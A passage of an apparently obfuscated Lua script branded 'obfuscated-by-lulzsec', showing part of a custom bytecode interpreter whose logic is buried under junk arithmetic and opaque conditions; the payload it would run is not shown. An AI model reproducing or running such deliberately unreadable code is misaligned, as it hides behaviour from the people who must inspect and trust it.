--obfuscated-by-lulzsec-






do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16)local v17=0;local v18;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;while true do if (v17==7) then function v29(v30,v31,v32)local v38=v30[1];local v39=v30[2];local v40=v30[3];return function(...)local v62=0;local v63;local v64;local v65;local v66;local v67;while true do if (v62==0) then v63=1;v64= -1;v62=1;end if (v62==3) then A,B=v27(v10(v67));if  not A[1] then local v76=0;local v77;while true do if (v76==0) then v77=v30[4][v63] or "?";error("Script error at ["   .. v77   .. "]:"   .. A[2]);break;end end else return v12(A,2,B);end break;end if (2==v62) then v67=nil;function v67()local v78=v38;local v79=Const;local v80=v39;local v81=v40;local v82=v27;local v83={};local v84={};local v85={};for v90=0,v66 do if ((v90>=v81) or ((5286 -2003)>=4104)) then v83[v90-v81]=v65[v90 + 1];else v85[v90]=v65[v90 + 1];end end local v86=(v66-v81) + 1 + 0;local v87;local v88;while true do local v91=596 -(269 + 327);while true do if ((v91==(318 -(129 + 189))) or ((1279 + 389)<=(486 + 1064))) then v87=v78[v63];v88=v87[(1049 -(491 + 557)) + 0];v91=931 -((157 -88) + 861);end if ((v91==(1 + 0)) or ((691 + 3549)>=4734)) then if (((2602 -1538)<=(5276 -(4076 -(101 + 61)))) and (v88<=(29 -10))) then if ((v88<=(7 + 2)) or ((1582 -727)>3046)) then if ((4377==(4214 + 163)) and (v88<=((1055 -(442 + 608)) -1))) then if (((1229 -(463 + 763))<=((1383 + 2775) -(90 + 964))) and (v88<=(1 + 0))) then if ((v88==((293 -(107 + 24)) -(131 + 31))) or (((4841 -(72 + 114)) -(391 + 197))>(5858 -(1148 + 222)))) then v85[v87[817 -(563 + 252)]]={};else local v115=0 -0;local v116;local v117;while true do if ((v115==(930 -(655 + 275))) or ((581 + 1000)==4515)) then v116=(0 + 0) -0;v117=nil;v115=1;end if ((v115==(1 + 0)) or ((5631 -2917)==(4409 -((4790 -3552) + 142)))) then while true do if (((3926 -(427 + 1421))<(6697 -2954)) and ((0 -0)==v116)) then v117=v87[2 + 0];do return v12(v85,v117,v117 + v87[1 + 2]);end break;end end break;end end end elseif (((2296 -(259 + 11))<=((8598 -5092) -(622 + 789))) and (v88<=((7 -1) -4))) then v63=v87[1 + 2];elseif ((v88>(3 + 0)) or ((3692 -(257 + 1140))==(978 -576))) then local v168=746 -(544 + 202);local v169;local v170;local v171;while true do if (((643 + 475)>(1352 -796)) and (v168==(1 -0))) then v171=nil;while true do if (((5689 -(256 + 599))>(417 -205)) and (v169==(0 -0))) then local v226=0;while true do if ((760==(10 + 750)) and (1==v226)) then v169=1 + 0;break;end if ((v226==(355 -(29 + 326))) or ((3171 -((1895 -(769 + 570)) + 319))<((3062 -(331 + 244)) -(625 + 37 + 142)))) then v170=0 + 0;v171=nil;v226=1 + 0;end end end if ((1==v169) or ((170 + 4711)<408)) then while true do if (((199 -(167 + 32))==v170) or ((1343 -(160 + 116))==4512)) then v171=v87[922 -(405 + 515)];do return v12(v85,v171,v64);end break;end end break;end end break;end if (((6553 -(1700 + 37))>634) and (v168==(0 + 0))) then v169=0;v170=nil;v168=1;end end elseif ((v87[2]==v85[v87[7 -3]]) or ((2008 + 816)<=(3456 -(437 + 918)))) then v63=v63 + 1 + 0;else v63=v87[1 + 2];end elseif (((733 -(51 + 322))<=(12164 -7261)) and (v88<=((7 -4) + 3))) then if ((v88==(211 -(163 + 43))) or ((1812 + (323 -191))>(11884 -(19863 -11329)))) then v85[v87[1301 -(1012 + 287)]]=v85[v87[2 + 1]][v87[4]];else v85[v87[2 + 0]]=v87[1 + 2]~=(0 -0);end elseif ((v88<=(2 + 5)) or ((205 + 1838)>(121 + 3163))) then local v120=0 + (0 -0);local v121;local v122;local v123;local v124;local v125;local v126;local v127;while true do if (((9426 -(4498 + 2633))==(3038 -(638 + 33 + 72))) and (2==v120)) then v125=nil;v126=nil;v120=3 + 0;end if (((3231 + 379)<3936) and (v120==1)) then v123=nil;v124=nil;v120=1100 -(427 + 671);end if ((v120==(3 + (0 -0))) or (552<=(56 + 43))) then v127=nil;while true do if ((v121==2) or ((6833 -(1370 + 3672))==(633 + 1156))) then v126=nil;v127=nil;v121=(1148 -(165 + 979)) -1;end if ((v121==(704 -(367 + 334))) or ((5176 -(1077 + 846))<=(4337 -(993 + 666)))) then while true do if (((1296 + 835)<=(5071 -(1280 + 63))) and (v122==(0 -0))) then local v232=1762 -(848 + 914);local v233;while true do if ((v232==(1415 -(202 + 1213))) or (1700==1388)) then v233=0 + 0 + 0;while true do if ((v233==(1 -(0 + 0))) or ((7212 -2535)<((4973 -(443 + 615)) + 233))) then v122=1 -0;break;end if (((11 + 10)==21) and (v233==(0 -0))) then v123=v87[2 + (0 -0)];v124=v87[3 + 1];v233=988 -(429 + 558);end end break;end end end if (((59 + 199 + 229)<=(5354 -(327 + (2250 -(173 + 447))))) and (v122==3)) then if (v127 or ((2688 + 1406)<(6364 -3511))) then local v254=0 + 0;local v255;local v256;while true do if (((2933 -(1772 + (1409 -(529 + 659))))<(4977 -(507 + 1033))) and (v254==(1358 -(928 + (1022 -593))))) then while true do if (((1365 + 1061)<(1482 + 1399)) and (v255==(1949 -(433 + 1516)))) then v256=0 -0;while true do if (((11232 -7326)<(1347 + 3171)) and (v256==(0 -0))) then v85[v125]=v127;v63=v87[2 + 1];break;end end break;end end break;end if (((10465 -6305)==4160) and (v254==(689 -(92 + 597)))) then v255=0;v256=nil;v254=(2121 -635) -(1234 + 251);end end else v63=v63 + (3 -2);end break;end if ((v122==(3 -(1 + 1))) or ((1187 + 3293)==(32 + 1206 + 1890))) then local v234=622 -(59 + 563);while true do if ((2583<2620) and (v234==(0 + 0))) then local v263=0 -0;while true do if ((v263==(1 + 0)) or ((3728 -(1216 + 595))>(12740 -10029))) then v234=(322 + 378) -(520 + (742 -(251 + 312)));break;end if (((2402 + (523 -(344 + 25)))<(496 + 2272)) and (v263==0)) then v125=v123 + (1706 -(738 + 966));v126={v85[v123](v85[v123 + 1],v85[v125])};v263=1;end end end if ((v234==(1 + 0 + 0)) or ((6887 -2662)<=(822 + 2093))) then v122=2 + 0;break;end end end if (((11541 -7987)>(643 -(63 + 118))) and ((7 -5)==v122)) then local v235=0 + 0;while true do if (((1862 -752)<=(6731 -5175)) and (v235==(0 + 0))) then local v264=0 -0;while true do if ((v264==(1 + 0)) or ((299 + 854)>(17172 -12411))) then v235=1;break;end if (((10541 -5951)>=(936 + 53)) and (v264==(0 + 0))) then for v292=1 + 0,v124 do v85[v125 + v292]=v126[v292];end v127=v126[(3 + 0) -2];v264=1242 -(395 + (2058 -(99 + 1113)));end end end if ((v235==(2 -(1 + 0))) or ((198 + 1812)<=(4496 -3563))) then v122=1 + 2;break;end end end end break;end if (((298 -150)<(2432 -(66 + (1141 -406)))) and ((4 -3)==v121)) then local v213=0 + 0;while true do if ((((16556 -10583) -2287)<4476) and (v213==(0 -0))) then v124=nil;v125=nil;v213=4 -3;end if (((24 + 3341)==(4251 -(448 + 438))) and (v213==(1 + 0))) then v121=433 -(405 + 26);break;end end end if (((4566 -((1309 -914) + 34))>=(4065 -(4225 -(448 + 1266)))) and (v121==0)) then local v214=0 -0;while true do if (((2763 -(401 + 1432))<(1398 -(19 + 6))) and (0==v214)) then v122=0 + 0;v123=nil;v214=1456 -(1189 + 266);end if ((4571==4571) and (v214==1)) then v121=1 + (615 -(311 + 304));break;end end end end break;end if ((((131 -84) + 2494)>=(2537 -1962)) and (v120==0)) then v121=311 -(258 + 53);v122=nil;v120=1 -0;end end elseif ((v88>(1230 -(461 + 761))) or ((1788 + 2735)<(1708 -(992 + 479)))) then v85[v87[(387 -(188 + 196)) -1]][v87[5 -2]]=v87[4];elseif (v85[v87[1 + 1]] or ((4980 -(352 + 488 + 54))<(212 + (3852 -2076)))) then v63=v63 + 1 + 0;else v63=v87[68 -(6 + 59)];end elseif ((v88<=(49 -35)) or ((4760 -1638)>(2697 + 1533))) then if (((4414 -(196 + 1299))>=(756 + 37)) and (v88<=(9 + 2))) then if (((1149 + 1492)>((8154 -5255) -(235 + 118 + 341))) and (v88==(26 -16))) then local v128=1323 -(1230 + 93);local v129;local v130;while true do if (((524 + 8)<=(9777 -6274)) and (v128==(0 -0))) then local v204=0 + 0;while true do if ((v204==(1 + 0)) or ((1982 -(1599 + 24))>=(2456 -1451))) then v128=475 -(188 + 286);break;end if (((12241 -8834)>(1714 -1188)) and (v204==(0 -0))) then v129=(0 + 0) -0;v130=nil;v204=1050 -(743 + 306);end end end if ((v128==(1 + 0)) or (4967<(3178 + (3122 -(458 + 1392))))) then while true do if ((v129==(1251 -(120 + 1131))) or ((7954 -3473)<676)) then v130=v87[5 -3];v85[v130]=v85[v130](v12(v85,v130 + 1 + 0,v87[1237 -(501 + 671 + 62)]));break;end end break;end end else local v131=630 -(10 + 620);local v132;local v133;local v134;local v135;local v136;while true do if (((9522 -6990)<(2516 + 266)) and ((1 + 0)==v131)) then v134=nil;v135=nil;v131=2 + 0;end if ((v131==(0 + 0)) or ((5558 -(262 + 336))<=(3152 -(1472 + 165)))) then v132=(3045 -(214 + 871)) -(1297 + 663);v133=nil;v131=1;end if ((v131==2) or (4237<(1883 + 1308))) then v136=nil;while true do if ((((6526 -2291) -1305)>(362 -(42 + 19))) and (v132==2)) then for v222=v133,v64 do local v223=0 -0;local v224;while true do if ((0==v223) or ((3781 -(194 + 195))<(5456 -3654))) then v224=1343 -(325 + 1018);while true do if ((v224==0) or ((9113 -6650)<=(2179 -(28 + 43)))) then v136=v136 + 1 + 0;v85[v222]=v134[v136];break;end end break;end end end break;end if ((1606>=(4412 -3518)) and (v132==1)) then local v216=0 + (0 -0);while true do if (((4263 -(155 + 534))>375) and (v216==(0 -0))) then v64=(v135 + v133) -1;v136=0;v216=1;end if ((2054==(4791 -2737)) and (v216==(2 -1))) then v132=1 + 1;break;end end end if (((7934 -4271)<=((13278 -7366) -(682 + 1105))) and ((1941 -(68 + 1873))==v132)) then v133=v87[447 -(440 + (356 -(70 + 281)))];v134,v135=v82(v85[v133](v85[v133 + 1]));v132=1 + 0;end end break;end end end elseif (((17752 -12780)>=(5631 -(752 + 710))) and (v88<=(29 -17))) then v85[v87[5 -3]]=v31[v87[3 + 0]];elseif (((2851 -(64 + 887))>(130 + 579)) and (v88>13)) then if ((v85[v87[680 -(530 + 148)]]~=v87[2 + 0 + 2]) or ((277 + 144)>3315)) then v63=v63 + (1018 -(501 + 516));else v63=v87[3 + 0];end else v85[v87[1 + 1]]=v32[v87[401 -((1084 -(476 + 444)) + 234)]];end elseif (((9085 -4792)>(844 -(102 + 42))) and (v88<=16)) then if ((585<=592) and (v88>(50 -(19 + 16)))) then if ((v85[v87[2]]==v87[11 -7]) or (123>=(5477 -(375 + 195)))) then v63=v63 + (1576 -(735 + 840));else v63=v87[5 -2];end else local v138=0 -0;local v139;local v140;while true do if ((((321 + 3186) -2740)==767) and (v138==((660 -(614 + 46)) + 0))) then local v205=0 -(0 + 0);while true do if ((((312 -127) + 3900)>(2294 -(224 + 931))) and (v205==(1304 -(195 + 1108)))) then v138=2 -1;break;end if ((1960<((17988 -(975 + 449)) -11809)) and (v205==(26 -(10 + 16)))) then v139=0;v140=nil;v205=2 -1;end end end if ((v138==1) or (4578<=(1000 + 128))) then while true do if (((2268 -(251 + 378))<4081) and (v139==((0 -0) -0))) then v140=v87[2];v85[v140]=v85[v140](v12(v85,v140 + 1,v64));break;end end break;end end end elseif ((v88<=(46 -29)) or (3294<=(4050 -(1137 + 158)))) then v32[v87[3]]=v85[v87[2]];elseif ((v88>(41 -23)) or ((6852 -2353)<(5393 -2478))) then local v174=0;local v175;while true do if (((8679 -4463)<=4433) and ((0 + 0)==v174)) then v175=v87[(1289 -(665 + 623)) + 1 + 0];v85[v175]=v85[v175](v85[v175 + 1]);break;end end else local v176=0 -(0 + 0);local v177;local v178;while true do if ((v176==1) or (4703<=662)) then while true do if ((v177==(1581 -(1251 + 330))) or (2795<=(2558 -((585 -222) + 1159)))) then v178=v87[4 -(2 + 0)];v85[v178](v85[v178 + 1]);break;end end break;end if (((70 + 23)<(43 + 4155)) and (v176==(0 -0))) then v177=127 -(98 + 29);v178=nil;v176=4 -3;end end end elseif ((3646<=((7888 -(1365 + 596)) -((1712 -(316 + 263)) + 699))) and (v88<=(1 + 28))) then if (((5296 -(82 + 262))>=(13166 -9228)) and (v88<=(11 + (877 -(721 + 143))))) then if ((v88<=((1214 + 344) -(460 + 1077))) or (940<=(630 + 217))) then if ((v88>(79 -59)) or ((4366 -(57 + 135))<(4127 -(573 + 28)))) then v85[v87[1932 -(1038 + 892)]][v87[1567 -(416 + 1148)]]=v85[v87[4]];else local v143=992 -(223 + 769);local v144;local v145;while true do if (((5941 -1928)>=(3298 -2116)) and (v143==(1173 -(325 + 847)))) then while true do if ((v144==(0 + (0 -0))) or ((7234 -3171)>((17633 -6308) -6880))) then v145=v87[2 + 0];do return v85[v145](v12(v85,v145 + 1,v87[1 + 0 + 2]));end break;end end break;end if ((v143==(634 -(149 + 485))) or (2314<=(3657 -2203))) then v144=0;v145=nil;v143=1 + (0 -0);end end end elseif (((1236 + (3465 -(569 + 303)))==3829) and (v88<=(1 + 21))) then do return v85[v87[2]];end elseif (((4244 -1290)>(207 + (310 -(16 + 14)))) and (v88>(94 -(19 + 52)))) then v85[v87[6 -4]]= -v85[v87[(2259 -(207 + 304)) -(1621 + 124)]];else local v180=0 + 0;local v181;local v182;local v183;while true do if ((v180==(1959 -(508 + 1450))) or ((847 + 1664 + 8)<=((4623 -(1301 + 349)) -(819 + 750)))) then v183=nil;while true do if ((v181==((5517 -3983) -(373 + 1161))) or (3598<(499 -285))) then local v227=0 + 0;local v228;while true do if ((v227==(0 -0)) or (1377==((7261 -(64 + 172)) -4492))) then v228=1747 -(1637 + 110);while true do if (((0 + 0)==v228) or (((23203 -16820) -(1779 + 115))<((2996 + 47) -800))) then local v289=0 + 0;while true do if (((1403 + 59)<4048) and ((1556 -(1249 + 306))==v289)) then v228=2 -1;break;end if (((4121 -(76 + 158))>(18 + 287)) and (v289==(963 -(637 + 326)))) then v182=v87[2];v183={};v289=1;end end end if ((v228==1) or (((9235 -2914) -(1419 + 77))<(3325 -(361 + 766)))) then v181=1;break;end end break;end end end if ((2355==(4502 -2147)) and (v181==(1 + 0))) then for v236=1 + 0 + (0 -0), #v84 do local v237=0 -0;local v238;while true do if ((v237==(0 -(1211 -(1069 + 142)))) or ((2696 -(834 + 934))>3562)) then v238=v84[v236];for v277=0 + 0, #v238 do local v278=0;local v279;local v280;local v281;local v282;while true do if ((2821>=946) and (v278==(4 -2))) then while true do if (((2678 + 837)>=(20 + (6584 -4334))) and (0==v279)) then local v302=0;while true do if (((2967 + 912)<=(4938 -(83 + 227))) and (v302==1)) then v279=1;break;end if ((3581>=(2196 -(163 + (81 -61)))) and (v302==0)) then v280=v238[v277];v281=v280[1 + 0];v302=1 -0;end end end if (((192 + 193)==(1327 -942)) and (v279==(632 -(19 + 41 + 571)))) then v282=v280[3 -1];if (((2537 -(29 + 1213))>=(2377 -(682 + 983))) and (v281==v85) and (v282>=v182)) then local v308=0 -0;local v309;while true do if ((v308==(0 + 0)) or ((5104 -(316 + 1038))>(21509 -(55817 -38999)))) then v309=420 -(157 + 263);while true do if (((0 -0)==v309) or (3088>=(5996 -(445 + 1026)))) then v183[v282]=v281[v282];v280[2 -1]=v183;break;end end break;end end end break;end end break;end if (((1 + (0 -0))==v278) or ((1072 + 329)<((515 -371) + 127))) then v281=nil;v282=nil;v278=2 -0;end if ((v278==(0 -0)) or ((13850 -10023)<=(76 + 2022))) then v279=0 + 0;v280=nil;v278=1 + 0;end end end break;end end end break;end end break;end if (((2459 -(711 + 926))<=(4933 -(1623 + 247))) and (v180==0)) then v181=(0 + 0) -0;v182=nil;v180=1;end end end elseif (((6803 -1859)>(7390 -(7173 -(493 + 1227)))) and (v88<=26)) then if ((v88>25) or (677>(20841 -15918))) then local v146=0 -0;local v147;while true do if (((2450 -(62 + 72))>=(2750 -(683 + 319))) and (v146==0)) then v147=v87[4 -2];v85[v147](v12(v85,v147 + 1 + 0 + 0,v87[207 -(128 + 76)]));break;end end else v85[v87[4 -2]]=v85[v87[8 -5]];end elseif (((2636 -((1605 -(844 + 731)) + 889))==(4576 -2859)) and (v88<=(10 + 17))) then v85[v87[848 -(404 + 442)]]=v87[1 + 2];elseif (((6121 -(1894 + 42))>(4457 -(154 + 495))) and (v88>(7 + 21))) then v85[v87[2 + 0]]();else local v184=0 + 0;local v185;local v186;local v187;while true do if ((v184==1) or (2256<=(2305 -(39 + 184)))) then v187=nil;while true do if ((v185==(0 + 0)) or (741>=(10955 -7180))) then local v229=1469 -(841 + 628);while true do if (((2908 -(535 + 354))<=(1384 + 754)) and (v229==(0 + 0))) then v186=342 -(254 + 88);v187=nil;v229=(424 -(180 + 241)) -2;end if ((v229==1) or (386>(971 -522))) then v185=2 -1;break;end end end if ((v185==(1 -(0 + 0))) or ((13895 -10294)==((2083 -(338 + 133)) + 1541))) then while true do if (((2419 + 1055)>=77) and ((0 -0)==v186)) then v187=v87[2];v85[v187](v12(v85,v187 + (1 -0),v64));break;end end break;end end break;end if (((912 + 1475)>=(2030 -978)) and ((0 -0)==v184)) then v185=0 + 0;v186=nil;v184=1 + 0;end end end elseif (((3788 -(26 + 15))>(833 + 2429)) and (v88<=(78 -44))) then if ((v88<=(87 -56)) or ((40 + 2329)>(13021 -8039))) then if (((16746 -12291)>(724 -504)) and (v88==((26 -12) + 16))) then local v150=0 -0;local v151;local v152;local v153;while true do if (((1217 -(7 + 100))<(1993 + 2779)) and (v150==(210 -(61 + 148)))) then v153=0;for v208=v151,v87[1394 -(939 + 451)] do local v209=0 + 0;while true do if ((v209==(0 + 0)) or ((5203 -(796 + (1253 -513)))<(90 + 3210))) then v153=v153 + (938 -(582 + 355)) + 0;v85[v208]=v152[v153];break;end end end break;end if (((6020 -3681)<=(452 + 3036)) and ((0 + 0)==v150)) then v151=v87[1305 -(502 + 801)];v152={v85[v151](v12(v85,v151 + (2 -1),v64))};v150=1;end end elseif (((231 + 2080)==(2026 + 285)) and  not v85[v87[2]]) then v63=v63 + (2 -1);else v63=v87[2 + 1];end elseif ((((4002 -(633 + 1306)) -(504 + 496 + 900))==(391 -228)) and (v88<=32)) then local v154=0;local v155;while true do if (((2847 -(764 + 43))<4624) and ((0 -0)==v154)) then v155=v85[v87[1037 -(970 + (248 -(115 + 70)))]];if (((2372 -(53 + 6))==(1011 + 1302)) and  not v155) then InstrPoint=InstrPoint + 1 + 0;else local v211=0 + 0;local v212;while true do if ((v211==(0 -0)) or ((2320 -1465)==(2744 -(824 + 71)))) then v212=0 -0;while true do if (((528 -(187 + (681 -346)))==(3 + 3)) and ((50 -(29 + 21))==v212)) then v85[v87[1 + 1]]=v155;InstrPoint=v87[5 -2];break;end end break;end end end break;end end elseif ((v88==(23 + 10)) or (4927<=(2146 -(487 + 887)))) then local v188=0 -0;local v189;local v190;local v191;local v192;local v193;local v194;while true do if (((21086 -16732)>=(17768 -13948)) and (v188==(0 -0))) then v189=0;v190=nil;v188=968 -(342 + 625);end if ((v188==(1 + 0)) or (838>4506)) then v191=nil;v192=nil;v188=1085 -(763 + 320);end if ((v188==2) or (((16472 -11510) -(383 + 537))<=(2337 -(460 + 31 + 122)))) then v193=nil;v194=nil;v188=(2206 -(493 + 711)) -(456 + 543);end if ((v188==3) or ((4975 -(1394 + 603))<=((1230 -(493 + 391)) -255))) then while true do if ((3643>2270) and (((1706 -991) -(160 + 555))==v189)) then v190=0;v191=nil;v189=(1 + 0) -0;end if ((2==v189) or (((13364 -(46 + 369)) -9296)<(318 + 839))) then v194=nil;while true do if ((v190==(1 + 0)) or ((133 + 2086 + 222)>(6120 -(802 + 389)))) then local v258=0 + 0;while true do if ((v258==(636 -(144 + 492))) or ((18869 -14516)<=754)) then local v290=994 -(597 + 397);while true do if ((2147==(3271 -(1084 + 40))) and (v290==0)) then v64=(v193 + v191) -(1219 -(120 + 1098));v194=1258 -(553 + 705);v290=1;end if ((239<=(1573 + 104)) and ((833 -(787 + 45))==v290)) then v258=2 -1;break;end end end if ((((19457 -14623) -(996 + 287))>(1540 -420)) and (v258==(2 -1))) then v190=3 -1;break;end end end if (((5602 -(997 + (706 -281)))<(2276 + 839 + 1620)) and (v190==(1402 -(949 + 453)))) then local v259=0 + 0;local v260;while true do if ((((7628 -2962) -(120 + 568))==(681 + 2385 + 912)) and (v259==(0 -0))) then v260=829 -((557 -(158 + 379)) + 809);while true do if ((v260==(474 -(426 + 47))) or ((2254 + 2406)<=(3139 -1972))) then v190=1;break;end if ((v260==(0 + 0)) or ((16961 -13355)<=(355 -(138 + 162 + 49)))) then local v295=0 -0;while true do if ((v295==(1965 -(1373 + 592))) or (1471>(1997 -(238 + 97)))) then v191=v87[1132 -(1017 + 113)];v192,v193=v82(v85[v191](v12(v85,v191 + (1 -0),v87[3 + 0])));v295=1878 -(1374 + 503);end if (((201 + 134 + 194)<(14651 -10712)) and (((2 + 1) -2)==v295)) then v260=(1 + 2) -(6 -4);break;end end end end break;end end end if (((12918 -8454)>(34 + 147)) and (v190==(2 + 0 + 0))) then for v265=v191,v64 do local v266=0 -(799 -(154 + 645));local v267;local v268;while true do if ((v266==0) or (4171<(1391 -(178 + 178)))) then v267=0;v268=nil;v266=402 -(198 + 203);end if (((2123 -1475)<(5970 -(901 + (4542 -3575)))) and (v266==(1 -0))) then while true do if ((v267==0) or ((15640 -10931)<2591)) then v268=0 + 0;while true do if (((1713 -(149 + 222))<(1102 + 1030 + 1740)) and (v268==(0 + (576 -(244 + 332))))) then v194=v194 + 1;v85[v265]=v192[v194];break;end end break;end end break;end end end break;end end break;end if (((16995 -13462)==(4689 -(2722 -(1015 + 551)))) and (v189==(1 + 0))) then v192=nil;v193=nil;v189=2 + 0;end end break;end end else local v195=0;local v196;local v197;local v198;local v199;while true do if (((2946 -(737 + 593))<(3238 + 1066)) and (v195==(26 -(12 + 14)))) then v196=0 + 0;v197=nil;v195=1584 -(497 + 1086);end if ((v195==((55 + 204) -(50 + 207))) or (4452<(2241 + 235 + 359 + 110))) then while true do if (((4859 -(1273 + 203))==(2653 + 730)) and (v196==(1462 -(638 + 824)))) then v197=v80[v87[(17 -9) -(14 -9)]];v198=nil;v196=2 -1;end if ((v196==(2 -1)) or (771>=((2321 -(53 + 73)) -(446 + 204)))) then local v230=498 -(491 + 7);while true do if ((((2322 -(748 + 444)) -(142 + (69 -36)))<=(4837 + 69)) and (((3408 -(992 + 749)) -(330 + 106 + (3015 -(1578 + 207))))==v230)) then v196=2 -0;break;end if ((2443>=(628 + 1412)) and (v230==(1917 -(521 + 1396)))) then v199={};v198=v9({},{__index=function(v269,v270)local v283=0 + 0;local v284;local v285;local v286;while true do if ((v283==(578 -(97 + (2336 -(834 + 1021))))) or ((6050 -3189)==(1317 -(336 + 59)))) then v284=0;v285=nil;v283=2 -1;end if ((v283==(641 -(20 + 620))) or (((873 + 21) -(457 + (686 -325)))>=(5316 -2843))) then v286=nil;while true do if ((v284==(204 -((266 -139) + 76))) or (4699<=3550)) then while true do if (((1843 + 530)==2373) and (v285==(1199 -(1121 + 78)))) then local v313=0 + 0;while true do if ((0==v313) or ((31 + 158)>590)) then local v319=0 -0;while true do if (((1533 -(1337 + 196))==v319) or (((940 + 448) -(149 + 109))<=(91 + 506))) then v286=v199[v270];return v286[(1148 -(605 + 542)) -(0 -0)][v286[994 -(514 + 478)]];end end end end end end break;end if (((2690 -2053)<=(4040 -(228 + 131))) and (v284==(1976 -(857 + 1119)))) then local v303=0 + 0;while true do if (((458 + 169 + 14)<(12982 -8498)) and (v303==(1508 -(217 + 1290)))) then v284=1;break;end if ((v303==(1883 -(1264 + 619))) or (2032>(3770 + 672))) then v285=0 + (0 -0);v286=nil;v303=1 -0;end end end end break;end end end,__newindex=function(v271,v272,v273)local v287=0 + 0;local v288;while true do if ((v287==0) or ((145 + 398)>1884)) then v288=v199[v272];v288[1 + 0][v288[7 -5]]=v273;break;end end end});v230=1;end end end if ((2601==(205 + 1191 + 1205)) and (v196==(2 -(0 -0)))) then for v239=1 -0,v87[1 + 3] do local v240=(818 -(815 + 3)) + 0 + 0;local v241;local v242;local v243;while true do if (((0 -0)==v240) or ((1942 -(63 + 531))>(4102 -(27 + 28)))) then v241=1244 -(853 + (743 -352));v242=nil;v240=(4 -2) -1;end if (((2444 -1473)<=(534 + 3480)) and (v240==(1 + 0))) then v243=nil;while true do if (((912 + 472)<=(257 + 1178)) and (v241==((0 -0) + 0))) then local v291=1154 -(307 + 847);while true do if (((2905 -(435 + 693))==(2561 -784)) and (v291==(0 + 0))) then v242=0 -0;v243=nil;v291=1440 -(636 + 803);end if (((2181 + 2535)==(4746 -(9 + 21))) and (v291==((1857 -(115 + 1146)) -(491 + 104)))) then v241=753 -(615 + 137);break;end end end if ((v241==(1547 -(147 + 1399))) or ((533 + 2983)==2282)) then while true do if ((221<=(1593 + 1014)) and ((0 + 0)==v242)) then local v299=0 -0;while true do if ((v299==(1 -0)) or ((623 -(86 + 81))>2278)) then v242=1;break;end if ((375<=(5401 -(565 + 444))) and (v299==(0 + 0))) then local v311=352 -(257 + 95);while true do if (((2372 -(483 + 183))==(4048 -2342)) and ((1397 -(1056 + 340))==v311)) then v299=(1447 + 194) -(446 + 1194);break;end if (((16 + 2367)>=(1217 -(142 + 148))) and (v311==0)) then v63=v63 + 1 + 0;v243=v78[v63];v311=(1963 -(894 + 1068)) + 0;end end end end end if ((v242==1) or ((2769 -2126)>=(4796 -(47 + 1059)))) then if (((234 + 267)<=(5154 -(1288 + 304))) and (v243[1445 -(1068 + 376)]==25)) then v199[v239-((1552 -(1434 + 116)) -1)]={v85,v243[(4 -3) + 2]};else v199[v239-(1 -(0 -0))]={v31,v243[3]};end v84[ #v84 + 1 + (0 -0)]=v199;break;end end break;end end break;end end end v85[v87[2]]=v29(v197,v198,v32);break;end end break;end if (((2879 -1914)==(2205 -(4200 -2960))) and (v195==(1 -(0 + 0)))) then v198=nil;v199=nil;v195=1113 -(146 + 965);end end end elseif (((3705 -1814)<=(4135 -(263 + 109))) and (v88<=36)) then if ((v88==(170 -135)) or (((141 + 5483) -3462)>(2951 -(98 + 182)))) then local v156=0 -0;local v157;local v158;local v159;local v160;while true do if ((v156==(1 + 0)) or ((7453 -(4053 -(838 + 125)))<=(981 -515))) then v159=nil;v160=nil;v156=2;end if ((((2086 -(224 + 1546)) + 2485)==(2253 + 548)) and (v156==(4 -2))) then while true do if (((0 + 0)==v157) or ((12271 -(8250 -(38 + 736)))<3516)) then local v218=0;while true do if (((10468 -6147)>=(2439 -672)) and (v218==(1622 -(270 + 1352)))) then v158=0;v159=nil;v218=1 -0;end if ((v218==(2 -1)) or ((266 + 1302)==(4766 -(676 + 108)))) then v157=1 + 0;break;end end end if (((741 + 43)>=(134 -92)) and (v157==1)) then v160=nil;while true do if ((v158==(184 -(165 + 18))) or ((3097 -2028)<=(191 + 811))) then v85[v159 + ((1117 -(103 + 42)) -((1064 -404) + (581 -270)))]=v160;v85[v159]=v160[v87[4 + 0]];break;end if ((((2277 -(656 + 804)) + 112)<=(2868 -1368)) and (v158==(0 + 0))) then local v246=0 + 0;while true do if ((v246==0) or (4872<=171)) then local v274=0 + 0;while true do if (((1476 + 446)==(1514 + 408)) and (v274==(790 -(219 + 571)))) then v159=v87[2];v160=v85[v87[3]];v274=1542 -(510 + 249 + 782);end if (((251 + 4231)<(8313 -3695)) and (v274==(1 + 0))) then v246=1 + 0;break;end end end if ((((463 + 284) -(559 + (532 -345)))==v246) or ((2702 -(170 + 1353))==(6162 -3204))) then v158=1 -(0 + 0);break;end end end end break;end end break;end if ((v156==(0 -0)) or ((44 + 3 + 1)>=(10397 -7771))) then v157=1967 -(1753 + 214);v158=nil;v156=1;end end else do return;end end elseif (((1951 -742)>=(1990 -(254 + 983))) and (v88<=(157 -120))) then v85[v87[1687 -(202 + 1483)]]=v29(v80[v87[3]],nil,v32);elseif ((v88>38) or ((305 + 1095)>=(3171 -(72 + 233)))) then for v206=v87[2 + 0],v87[4 -1] do v85[v206]=nil;end else local v200=0 -0;local v201;local v202;local v203;while true do if (((0 -(1648 -(257 + 1391)))==v200) or (((1347 -(304 + 386)) + 2761)>(5072 -1211))) then v201=0;v202=nil;v200=1 + 0;end if (((1362 -(1042 + 262))<(2802 -(159 + 1091))) and (v200==(1476 -(1055 + 420)))) then v203=nil;while true do if ((v201==(2 -1)) or (2686==(4062 -(679 + 61)))) then while true do if (((2896 + (2188 -(231 + 1633)))>((18 + 17) -14)) and (v202==(0 + 0))) then v203=v87[2 + 0];v85[v203]=v85[v203]();break;end end break;end if ((v201==0) or ((5246 -(503 + 55))<=2947)) then v202=0 -0;v203=nil;v201=3 -2;end end break;end end end v63=v63 + (1 -0);break;end end end end v62=3;end if (1==v62) then v65={...};v66=v11("#",...) -1;v62=2;end end end;end return v29(v28(),{},v16)();end if (v17==4) then function v24()local v41=v23();local v42=v23();return (( -((34 + 208) -(34 + 206)) * v20(v42,9 + 16 + 7)) + 1 + 0) * (((1196 -(20 + 316)) -((382 -230) + 706))^(v20(v42,48 -27,20 + 11) -(647 + 376))) * ((((v20(v42,1,4 + 16) * ((4 -2)^(116 -84))) + v41)/(2^52)) + (4 -3));end v25=nil;function v25(v33)local v43;if  not v33 then v33=v23();if (v33==(0 + 0)) then return "";end end 